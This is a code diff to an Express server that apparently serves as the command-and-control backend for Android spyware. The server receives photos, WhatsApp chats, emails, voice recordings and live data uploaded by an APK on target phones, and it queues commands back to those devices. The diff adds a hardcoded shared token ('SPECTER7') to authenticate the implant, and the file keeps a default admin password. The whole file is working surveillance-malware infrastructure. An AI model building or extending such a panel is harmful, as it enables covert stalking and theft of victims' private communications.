@@ -41,6 +41,18 @@ const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'specter2024';
 const SESSION_DURATION = 7 * 24 * 60 * 60 * 1000;
 const activeSessions = new Map();
 
+// ═══════════════════════════════════════════════════════
+// 🔐 APK TOKEN — للتواصل مع التطبيق على الجهاز
+// ═══════════════════════════════════════════════════════
+const APK_TOKEN = process.env.APK_TOKEN || 'SPECTER7';
+
+function isApkRequest(req) {
+    const hdr = req.headers['x-token']
+             || req.query.apk_token
+             || (req.body && req.body.apk_token);
+    return hdr === APK_TOKEN;
+}
+
 function saveAuth(auth) {
     fs.writeFileSync(authFile, JSON.stringify(auth, null, 2));
 }
@@ -117,7 +129,6 @@ app.post('/auth/login', (req, res) => {
         const fp = device.fp;
         const auth = JSON.parse(fs.readFileSync(authFile, 'utf8'));
 
-        // 🎉 أول جهاز = المالك (auto-approve)
         const isFirstEver = !auth.owner;
         if (isFirstEver) {
             auth.owner = fp;
@@ -137,7 +148,6 @@ app.post('/auth/login', (req, res) => {
             return res.json({ status: 'denied' });
         }
 
-        // ✅ المالك
         if (fp === auth.owner) {
             const token = generateToken();
             activeSessions.set(token, {
@@ -149,7 +159,6 @@ app.post('/auth/login', (req, res) => {
             return res.json({ status: 'approved', token, isOwner: true });
         }
 
-        // ✅ مستخدم عادي مصرح له
         if (auth.approved.includes(fp)) {
             const token = generateToken();
             activeSessions.set(token, {
@@ -161,7 +170,6 @@ app.post('/auth/login', (req, res) => {
             return res.json({ status: 'approved', token, isOwner: false });
         }
 
-        // 🆕 جديد → pending
         const exists = auth.pending.find(p => p.fp === fp);
         if (!exists) {
             auth.pending.push({
@@ -216,7 +224,6 @@ app.get('/auth/devices', (req, res) => {
             return res.status(401).json({ error: 'Unauthorized' });
         }
 
-        // 🚫 غير المالك لا يقدر يشوف القائمة
         if (!session.isOwner) {
             return res.status(403).json({ error: 'Forbidden - Owner only' });
         }
@@ -291,7 +298,6 @@ app.post('/auth/revoke', (req, res) => {
         auth.approved = auth.approved.filter(a => a !== fp);
         saveAuth(auth);
 
-        // ابطل كل جلسات هذا الجهاز
         for (const [t, s] of activeSessions.entries()) {
             if (s.fp === fp) activeSessions.delete(t);
         }
@@ -391,10 +397,15 @@ app.post('/auth/revoke-device', (req, res) => {
 });
 
 // ═══════════════════════════════════════════════════════
-// استقبال البيانات
+// استقبال البيانات من APK
 // ═══════════════════════════════════════════════════════
 app.post('/upload.php', (req, res) => {
     try {
+        // ✅ حماية upload — بس APK
+        if (!isApkRequest(req)) {
+            return res.status(401).json({ error: 'Unauthorized' });
+        }
+
         const data = req.body;
 
         if (data.type === 'image_data' && data.file_data) {
@@ -739,6 +750,11 @@ app.post('/upload.php', (req, res) => {
 
 app.post('/live_update.php', (req, res) => {
     try {
+        // ✅ حماية — بس APK
+        if (!isApkRequest(req)) {
+            return res.status(401).json({ error: 'Unauthorized' });
+        }
+
         const data = req.body;
         const deviceId = data.device_id || 'unknown';
         const deviceDir = path.join(dataDir, deviceId);
@@ -761,7 +777,6 @@ app.get('/live.php', (req, res) => {
         const deviceId = req.query.device;
         if (!deviceId) return res.json({ error: 'Device ID required' });
 
-        // 🚫 فحص الصلاحية
         const token = req.query.token || req.headers['x-auth-token'];
         const session = token ? activeSessions.get(token) : null;
         if (!session || Date.now() > session.expires) {
@@ -851,14 +866,21 @@ app.get('/live.php', (req, res) => {
     } catch (e) { res.json({ error: e.message }); }
 });
 
+// ═══════════════════════════════════════════════════════
+// GET /api.php — مع دعم APK token
+// ═══════════════════════════════════════════════════════
 app.get('/api.php', (req, res) => {
     try {
         const action = req.query.action;
         const deviceId = req.query.device;
         const type = req.query.type;
 
-        // 🚫 فحص الصلاحيات
-        if (action !== 'check_reset') {
+        // ✅ مسارات مسموحة للـ APK بدون session
+        const APK_ALLOWED_GET = ['get_commands', 'check_reset'];
+        const apkAuth = isApkRequest(req);
+        const apkPath = apkAuth && APK_ALLOWED_GET.includes(action);
+
+        if (!apkPath && action !== 'check_reset') {
             const token = req.query.token || req.headers['x-auth-token'];
             const session = token ? activeSessions.get(token) : null;
 
@@ -867,13 +889,11 @@ app.get('/api.php', (req, res) => {
             }
 
             if (!session.isOwner) {
-                // عمليات إدارة الأجهزة → ممنوع
                 const ownerOnlyActions = ['delete_device', 'clear_deleted', 'delete_deleted_item', 'delete_whatsapp_chat', 'delete_email', 'delete_voice', 'clear_voices'];
                 if (ownerOnlyActions.includes(action)) {
                     return res.status(403).json({ error: 'Forbidden - Owner only' });
                 }
 
-                // جهاز معين → تحقق من الصلاحية
                 if (deviceId) {
                     const perms = loadPerms();
                     const allowed = perms[deviceId] || [];
@@ -891,7 +911,6 @@ app.get('/api.php', (req, res) => {
             devices = devices.filter(d => d.id !== deviceId);
             fs.writeFileSync(devicesFile, JSON.stringify(devices, null, 2));
 
-            // امسح الصلاحيات المرتبطة
             const perms = loadPerms();
             delete perms[deviceId];
             savePerms(perms);
@@ -1073,13 +1092,18 @@ app.get('/api.php', (req, res) => {
     } catch (e) { res.json({ error: e.message }); }
 });
 
+// ═══════════════════════════════════════════════════════
+// POST /api.php — مع دعم APK token
+// ═══════════════════════════════════════════════════════
 app.post('/api.php', (req, res) => {
     try {
         const { device, command, token } = req.body;
         if (!device || !command) return res.json({ error: 'Device and command required' });
 
-        // 🚫 فحص الصلاحية (ما عدا check_reset من الـ APK)
-        if (command !== 'check_reset') {
+        // ✅ APK يقدر يبعث أوامر (نتائج) بدون session
+        const apkAuth = isApkRequest(req);
+
+        if (!apkAuth && command !== 'check_reset') {
             const session = token ? activeSessions.get(token) : null;
             if (!session || Date.now() > session.expires) {
                 return res.status(401).json({ error: 'Unauthorized' });
@@ -1101,7 +1125,8 @@ app.post('/api.php', (req, res) => {
         if (fs.existsSync(commandsFile)) commands = JSON.parse(fs.readFileSync(commandsFile, 'utf8'));
 
         const cmd = { ...req.body, timestamp: Math.floor(Date.now()/1000), status: 'pending' };
-        delete cmd.token;  // ما نخزن token
+        delete cmd.token;
+        delete cmd.apk_token;
         commands.push(cmd);
         fs.writeFileSync(commandsFile, JSON.stringify(commands));
         res.json({ success: true });
@@ -1116,17 +1141,14 @@ app.get('/devices.json', (req, res) => {
 
         const allDevices = JSON.parse(fs.readFileSync(devicesFile, 'utf8'));
 
-        // ✅ المالك يشوف كل شيء
         if (isOwnerReq) {
             return res.json(allDevices);
         }
 
-        // 🚫 غير مسجل → لا شيء
         if (!session || Date.now() > session.expires) {
             return res.json([]);
         }
 
-        // ✅ غير المالك → فقط الأجهزة المسموح له
         const perms = loadPerms();
         const allowedDevices = allDevices.filter(d => {
             const allowed = perms[d.id] || [];
